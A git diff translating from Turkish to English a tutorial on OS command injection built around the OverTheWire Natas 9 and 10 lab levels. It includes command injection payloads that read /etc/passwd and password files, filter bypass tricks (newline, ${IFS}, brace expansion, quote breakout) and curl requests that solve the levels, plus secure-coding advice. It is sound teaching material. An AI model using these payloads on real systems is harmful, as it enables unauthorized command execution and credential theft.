@@ -1,133 +1,133 @@
-# 🌐 Web Güvenliği — Command Injection
+# 🌐 Web Security — Command Injection
 
-> Uygulama kullanıcı girdisini alıp doğrudan shell komutuna ekliyorsa,
-> sen bir komut değil iki komut gönderebilirsin.
-
----
-
-## 📋 İçindekiler
-
-- [Command Injection Nedir?](#command-injection-nedir)
-- [Shell Operatörleri](#shell-operatörleri)
-- [PHP'de Tehlikeli Fonksiyonlar](#phpdeki-tehlikeli-fonksiyonlar)
-- [Filtre Bypass Teknikleri](#filtre-bypass-teknikleri)
-- [Natas'ta Kullanım](#natasta-kullanım)
+> If the application takes user input and adds it directly to a shell command,
+> you can send not one command but two.
 
 ---
 
-## Command Injection Nedir?
+## 📋 Table of Contents
 
-Uygulama, kullanıcıdan aldığı bir değeri doğrudan bir shell komutunun içine gömdüğünde ortaya çıkar.
+- [What Is Command Injection?](#what-is-command-injection)
+- [Shell Operators](#shell-operators)
+- [Dangerous Functions in PHP](#dangerous-functions-in-php)
+- [Filter Bypass Techniques](#filter-bypass-techniques)
+- [Usage in Natas](#usage-in-natas)
+
+---
+
+## What Is Command Injection?
+
+It arises when the application embeds a value it receives from the user directly inside a shell command.
 
 ```php
-// Tehlikeli kod:
-$kelime = $_GET['kelime'];
-passthru("grep -r $kelime /var/log/");
+// Dangerous code:
+$word = $_GET['word'];
+passthru("grep -r $word /var/log/");
 ```
 
-Kullanıcı `natas` yazarsa sunucu şunu çalıştırır:
+If the user types `natas`, the server runs:
 
 ```bash
 grep -r natas /var/log/
 ```
 
-Normal. Ama kullanıcı `natas; cat /etc/passwd` yazarsa:
+Normal. But if the user types `natas; cat /etc/passwd`:
 
 ```bash
 grep -r natas /var/log/; cat /etc/passwd
 #                       ↑
-#           ikinci komut eklendi — çalışır!
+#           a second command was added — it runs!
 ```
 
-Sunucu iki komutu da çalıştırır ve `/etc/passwd` içeriğini ekrana basar.
+The server runs both commands and prints the contents of `/etc/passwd` to the screen.
 
 ---
 
-## Shell Operatörleri
+## Shell Operators
 
-Komutları birleştirmek için kullanılan shell operatörleri, command injection'ın temelidir.
+The shell operators used to combine commands are the foundation of command injection.
 
-| Operatör | Sözdizimi | Ne Zaman Çalışır |
+| Operator | Syntax | When It Runs |
 |----------|-----------|------------------|
-| `;` | `cmd1; cmd2` | Her zaman (cmd1 başarısız olsa bile) |
-| `&&` | `cmd1 && cmd2` | Sadece cmd1 başarılıysa |
-| `\|\|` | `cmd1 \|\| cmd2` | Sadece cmd1 başarısızsa |
-| `\|` | `cmd1 \| cmd2` | cmd1 çıktısını cmd2'ye pipe eder |
-| `` `cmd` `` | `` echo `id` `` | cmd'nin çıktısını yerleştirir |
-| `$(cmd)` | `echo $(id)` | cmd'nin çıktısını yerleştirir (modern) |
-| `\n` | `cmd1%0acmd2` | Yeni satır — bazı filtreleri atlatır |
+| `;` | `cmd1; cmd2` | Always (even if cmd1 fails) |
+| `&&` | `cmd1 && cmd2` | Only if cmd1 succeeds |
+| `\|\|` | `cmd1 \|\| cmd2` | Only if cmd1 fails |
+| `\|` | `cmd1 \| cmd2` | Pipes cmd1's output to cmd2 |
+| `` `cmd` `` | `` echo `id` `` | Inserts cmd's output |
+| `$(cmd)` | `echo $(id)` | Inserts cmd's output (modern) |
+| `\n` | `cmd1%0acmd2` | Newline — evades some filters |
 
-### Örnekler
+### Examples
 
 ```bash
-# Noktalı virgül — her iki komutu çalıştır
+# Semicolon — run both commands
 natas; id
 
-# Çıktıyı birleştir
+# Combine the output
 natas | cat /etc/natas_webpass/natas10
 
-# Sadece ikinci komutu çalıştır
+# Run only the second command
 nothing || cat /etc/natas_webpass/natas10
 
-# Komut yerleştirme
+# Command substitution
 $(cat /etc/natas_webpass/natas10)
 ```
 
 ---
 
-## PHP'de Tehlikeli Fonksiyonlar
+## Dangerous Functions in PHP
 
 ```php
-// Kullanıcı girdisi doğrudan komuta gidiyor — hepsi tehlikeli
+// User input goes directly to the command — all dangerous
 system("grep $input /var/log/");
 passthru("grep $input /var/log/");
 exec("grep $input /var/log/");
 shell_exec("grep $input /var/log/");
 
-// Backtick operatörü — exec ile aynı
+// Backtick operator — same as exec
 $output = `grep $input /var/log/`;
 ```
 
-### Fark Nedir?
+### What's the Difference?
 
-| Fonksiyon | Çıktı | Döndürür |
+| Function | Output | Returns |
 |-----------|-------|----------|
-| `system()` | Ekrana basar | Son satır |
-| `passthru()` | Ekrana basar (binary safe) | Yok |
-| `exec()` | Ekrana **basmaz** | Son satır |
-| `shell_exec()` | Ekrana **basmaz** | Tüm çıktı |
+| `system()` | Prints to the screen | Last line |
+| `passthru()` | Prints to the screen (binary safe) | Nothing |
+| `exec()` | Does **not** print to the screen | Last line |
+| `shell_exec()` | Does **not** print to the screen | Full output |
 
-Natas 9 ve 10'da `passthru` kullanılır — çıktı doğrudan ekrana gelir.
+In Natas 9 and 10, `passthru` is used — the output comes directly to the screen.
 
 ---
 
-## Filtre Bypass Teknikleri
+## Filter Bypass Techniques
 
-Uygulama bazı karakterleri filtreleyebilir. Natas 10 buna güzel bir örnek.
+The application may filter some characters. Natas 10 is a good example of this.
 
-### Natas 9 — Filtresiz
+### Natas 9 — No Filter
 
 ```php
 $key = $_REQUEST['needle'];
 passthru("grep -i $key dictionary.txt");
 ```
 
-Herhangi bir shell operatörü çalışır:
+Any shell operator works:
 
 ```
-Girdi: . /etc/natas_webpass/natas10
-Komut: grep -i . /etc/natas_webpass/natas10 dictionary.txt
-       → şifreyi ekrana basar
+Input:    . /etc/natas_webpass/natas10
+Command:  grep -i . /etc/natas_webpass/natas10 dictionary.txt
+          → prints the password to the screen
 ```
 
-`.` karakteri grep'te "her karakterle eşleş" anlamına gelir — dosyayı tamamen okur.
+The `.` character in grep means "match any character" — it reads the file completely.
 
-### Natas 10 — Filtreleme Var
+### Natas 10 — Filtering Present
 
 ```php
 $key = $_REQUEST['needle'];
 
-// ; | & karakterlerini filtrele
+// Filter the ; | & characters
 if(preg_match('/[;|&]/', $key)) {
     print "Input contains an illegal character!";
 } else {
@@ -135,75 +135,75 @@ if(preg_match('/[;|&]/', $key)) {
 }
 ```
 
-`;`, `|`, `&` karakterleri yasak. Ama `. /etc/natas_webpass/natas10` hâlâ çalışır çünkü bu karakterleri kullanmıyor.
+The `;`, `|`, `&` characters are forbidden. But `. /etc/natas_webpass/natas10` still works because it doesn't use those characters.
 
 ```
-Girdi: . /etc/natas_webpass/natas10
-Komut: grep -i . /etc/natas_webpass/natas10 dictionary.txt
+Input:    . /etc/natas_webpass/natas10
+Command:  grep -i . /etc/natas_webpass/natas10 dictionary.txt
 ```
 
-grep iki dosyayı da tarıyor ve her iki dosyadaki her satırı `.` ile eşleştiriyor.
+grep scans both files and matches every line in both files against `.`.
 
-### Yaygın Bypass Yöntemleri
+### Common Bypass Methods
 
-**1. Alternatif ayırıcılar**
+**1. Alternative separators**
 
 ```bash
-# ; filtreleniyorsa yeni satır dene
+# If ; is filtered, try a newline
 cmd1%0acmd2          # URL encoded newline
 ```
 
-**2. Filtrelenmeyen operatörler**
+**2. Unfiltered operators**
 
 ```bash
-# & filtreleniyorsa || dene (veya tersi)
+# If & is filtered, try || (or vice versa)
 cmd1 || cmd2
 ```
 
-**3. grep'in özelliklerini kullanmak**
+**3. Using grep's features**
 
 ```bash
-# grep -i PATTERN FILE1 FILE2 ... şeklinde birden fazla dosya alır
-# Dictionary.txt yerine hedef dosyayı ver
+# grep -i PATTERN FILE1 FILE2 ... takes multiple files
+# Instead of dictionary.txt, give the target file
 . /etc/natas_webpass/natas10
-#↑ grep pattern'i: her karakterle eşleş
-#  /etc/natas_webpass/natas10: bu dosyayı da tara
+#↑ grep pattern: match any character
+#  /etc/natas_webpass/natas10: scan this file too
 ```
 
-**4. Tırnak içine almak (quoting)**
+**4. Quoting**
 
-Bazı durumlarda girdi tırnak içinde olur:
+In some cases the input is inside quotes:
 
 ```php
 passthru("grep -i '$key' dictionary.txt");
 //                 ↑   ↑
-//           tek tırnak içinde
+//           inside single quotes
 ```
 
-Bypass için tırnaktan çık:
+To bypass, break out of the quotes:
 
 ```
-Girdi: '; cat /etc/passwd; echo '
-Komut: grep -i ''; cat /etc/passwd; echo '' dictionary.txt
+Input:    '; cat /etc/passwd; echo '
+Command:  grep -i ''; cat /etc/passwd; echo '' dictionary.txt
 ```
 
-**5. Boşluk alternatifi**
+**5. Space alternatives**
 
-Boşluk filtreleniyorsa:
+If space is filtered:
 
 ```bash
-cat${IFS}/etc/passwd      # $IFS = Internal Field Separator (boşluk)
-cat</etc/passwd           # yönlendirme ile
+cat${IFS}/etc/passwd      # $IFS = Internal Field Separator (space)
+cat</etc/passwd           # with redirection
 {cat,/etc/passwd}         # brace expansion
 ```
 
 ---
 
-## Natas'ta Kullanım
+## Usage in Natas
 
-### Natas 9 — Temel Command Injection
+### Natas 9 — Basic Command Injection
 
-**Kaynak kod:**
+**Source code:**
 
 ```php
 <?php
@@ -221,32 +221,32 @@ if($key != "") {
 
 **Exploit:**
 
-Herhangi bir şifreyi okumak için grep'e dosya olarak ver:
+To read any password, give it to grep as a file:
 
 ```
-Girdi: . /etc/natas_webpass/natas10
+Input:    . /etc/natas_webpass/natas10
 ```
 
-Bu şu komutu çalıştırır:
+This runs the following command:
 
 ```bash
 grep -i . /etc/natas_webpass/natas10 dictionary.txt
 ```
 
-Sonuç: `/etc/natas_webpass/natas10` içindeki her satır ekrana gelir.
+Result: every line in `/etc/natas_webpass/natas10` comes to the screen.
 
-**curl ile:**
+**With curl:**
 
 ```bash
-curl -u natas9:[şifre] \
+curl -u natas9:[password] \
      "http://natas9.natas.labs.overthewire.org/?needle=.+/etc/natas_webpass/natas10&submit=Search"
 ```
 
 ---
 
-### Natas 10 — Filtreli Command Injection
+### Natas 10 — Filtered Command Injection
 
-**Kaynak kod:**
+**Source code:**
 
 ```php
 <?php
@@ -266,67 +266,67 @@ if($key != "") {
 ?>
 ```
 
-**Analiz:** `;`, `|`, `&` yasak — ama aynı trick hâlâ çalışıyor.
+**Analysis:** `;`, `|`, `&` are forbidden — but the same trick still works.
 
 ```
-Girdi: . /etc/natas_webpass/natas11
-Komut: grep -i . /etc/natas_webpass/natas11 dictionary.txt
+Input:    . /etc/natas_webpass/natas11
+Command:  grep -i . /etc/natas_webpass/natas11 dictionary.txt
 ```
 
-Yasak karakterlerin hiçbirini kullanmadık.
+We didn't use any of the forbidden characters.
 
-**curl ile:**
+**With curl:**
 
 ```bash
-curl -u natas10:[şifre] \
+curl -u natas10:[password] \
      "http://natas10.natas.labs.overthewire.org/?needle=.+/etc/natas_webpass/natas11&submit=Search"
 ```
 
 ---
 
-### Güvenli Kod Nasıl Olmalı?
+### What Should Secure Code Look Like?
 
 ```php
-// KÖTÜ — direkt concatenation
+// BAD — direct concatenation
 passthru("grep $input dictionary.txt");
 
-// İYİ — escapeshellarg ile escape et
+// GOOD — escape with escapeshellarg
 $safe = escapeshellarg($input);
 passthru("grep $safe dictionary.txt");
 
-// DAHA İYİ — shell kullanma, PHP fonksiyonunu kullan
+// BETTER — don't use the shell, use a PHP function
 $contents = file_get_contents('dictionary.txt');
 $lines = explode("\n", $contents);
 $results = array_filter($lines, fn($line) => str_contains($line, $input));
 ```
 
-`escapeshellarg()` → Girdiyi tek tırnak içine alır, içindeki tek tırnakları escape eder.
-`escapeshellcmd()` → Shell meta karakterlerini escape eder (ama daha zayıf).
+`escapeshellarg()` → Wraps the input in single quotes and escapes any single quotes inside it.
+`escapeshellcmd()` → Escapes shell meta-characters (but is weaker).
 
 ---
 
-### Command Injection — Kontrol Listesi
+### Command Injection — Checklist
 
 ```
-Kaynak kodda kontrol et:
-  ☐ system(), passthru(), exec(), shell_exec() var mı?
-  ☐ Kullanıcı girdisi ($GET, $POST, $COOKIE) komuta gidiyor mu?
-  ☐ escapeshellarg() veya escapeshellcmd() kullanılıyor mu?
-  ☐ Hangi karakterler filtreleniyor?
-  ☐ Filtrelenmeyenlerle ne yapılabilir?
+Check in the source code:
+  ☐ Are system(), passthru(), exec(), shell_exec() present?
+  ☐ Does user input ($GET, $POST, $COOKIE) go to a command?
+  ☐ Is escapeshellarg() or escapeshellcmd() used?
+  ☐ Which characters are filtered?
+  ☐ What can be done with the unfiltered ones?
 
-Dene:
-  ☐ ; id                      → komut ayırıcı
+Try:
+  ☐ ; id                      → command separator
   ☐ | id                      → pipe
-  ☐ && id                     → ve
-  ☐ || id                     → veya
+  ☐ && id                     → and
+  ☐ || id                     → or
   ☐ $(id)                     → command substitution
   ☐ . /etc/natas_webpass/...  → grep trick
 ```
 
 ---
 
-## 🔗 Kaynaklar
+## 🔗 Resources
 
 - [PortSwigger — OS Command Injection](https://portswigger.net/web-security/os-command-injection)
 - [OWASP — Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
@@ -334,7 +334,7 @@ Dene:
 
 ---
 
-**Önceki konu:** [06_encoding_ve_obfuscation.md](./06_encoding_ve_obfuscation.md)
-**Sonraki konu:** [08_lfi_ve_path_traversal.md](./08_lfi_ve_path_traversal.md)
+**Previous topic:** [06_encoding_and_obfuscation.md](./06_encoding_and_obfuscation.md)
+**Next topic:** [08_lfi_and_path_traversal.md](./08_lfi_and_path_traversal.md)
 
-*Bu rehber [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) reposunun bir parçasıdır.*
+*This guide is part of the [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) repository.*
